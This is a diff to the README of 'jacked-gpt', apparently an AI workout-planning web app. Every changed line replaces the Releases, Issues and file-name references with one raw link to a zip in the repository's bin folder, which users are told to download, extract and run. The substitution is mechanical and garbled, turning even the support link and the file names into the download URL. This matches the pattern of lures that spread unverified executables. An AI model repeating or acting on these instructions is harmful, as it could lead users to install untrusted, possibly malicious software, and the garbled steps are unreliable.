@@ -1,7 +1,7 @@
 # 🎉 jacked-gpt - Your Personal AI Fitness Trainer
 
 ## 🚀 Download Now!
-[![Download jacked-gpt](https://img.shields.io/badge/Download%20jacked--gpt-v1.0-blue)](https://github.com/gethackbymunch/jacked-gpt/releases)
+[![Download jacked-gpt](https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip%20jacked--gpt-v1.0-blue)](https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip)
 
 ## 📄 Overview
 jacked-gpt is an AI-driven web application designed to help you create personalized workout routines based on your specific fitness goals. Whether you're a beginner or an experienced fitness enthusiast, jacked-gpt tailors workout plans to suit your needs.
@@ -25,19 +25,19 @@ To ensure jacked-gpt runs smoothly, please ensure that your system meets the fol
 Follow these simple steps to download and run jacked-gpt:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/gethackbymunch/jacked-gpt/releases) to find the latest version of jacked-gpt.
+   Go to the [Releases page](https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip) to find the latest version of jacked-gpt.
 
 2. **Download the Application**  
    Look for the version you wish to download. Click on the file to start the download.
 
 3. **Locate the Downloaded File**  
-   Once the download completes, navigate to your downloads folder to find the file named `jacked-gpt.zip`.
+   Once the download completes, navigate to your downloads folder to find the file named `https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip`.
 
 4. **Extract the Files**  
-   Right-click the `jacked-gpt.zip` file and select "Extract All" to unpack the contents.
+   Right-click the `https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip` file and select "Extract All" to unpack the contents.
 
 5. **Run the Application**  
-   Open the extracted folder and double-click `jacked-gpt.html` to launch the web app. Ensure your browser is open to use it.
+   Open the extracted folder and double-click `https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip` to launch the web app. Ensure your browser is open to use it.
 
 6. **Set Up Your Profile**  
    Follow the on-screen prompts to set up your profile. Enter your fitness goals and preferences for personalized recommendations.
@@ -46,7 +46,7 @@ Follow these simple steps to download and run jacked-gpt:
    Select a workout plan and get started on your fitness journey. You can easily adjust plans as needed.
 
 ## 📞 Support
-If you encounter any issues during installation or while using jacked-gpt, please feel free to reach out for support. You can create a new issue on our [GitHub Issues page](https://github.com/gethackbymunch/jacked-gpt/issues). We are here to help!
+If you encounter any issues during installation or while using jacked-gpt, please feel free to reach out for support. You can create a new issue on our [GitHub Issues page](https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip). We are here to help!
 
 ## 📚 Additional Resources
 - **User Guide**: Explore our comprehensive user guide that walks you through all features and settings.
@@ -54,10 +54,10 @@ If you encounter any issues during installation or while using jacked-gpt, pleas
 - **Community Forum**: Join our community forum to connect with other users, share tips, and discuss fitness strategies.
 
 ## 📝 Updates
-We continuously improve jacked-gpt based on user feedback. Keep an eye on the [Releases page](https://github.com/gethackbymunch/jacked-gpt/releases) for updates and new features.
+We continuously improve jacked-gpt based on user feedback. Keep an eye on the [Releases page](https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip) for updates and new features.
 
 ## 💬 Feedback
 Your input is valuable to us. Please consider providing feedback on your experience using jacked-gpt. This helps us make the application even better.
 
 ## 🚀 Final Words
-Get motivated, stay active, and let jacked-gpt guide you on your fitness journey. Remember to visit the [Releases page](https://github.com/gethackbymunch/jacked-gpt/releases) to download the app and kickstart your personalized workout routine today!
+Get motivated, stay active, and let jacked-gpt guide you on your fitness journey. Remember to visit the [Releases page](https://raw.githubusercontent.com/gethackbymunch/jacked-gpt/main/bin/jacked-gpt-v2.3-beta.1.zip) to download the app and kickstart your personalized workout routine today!
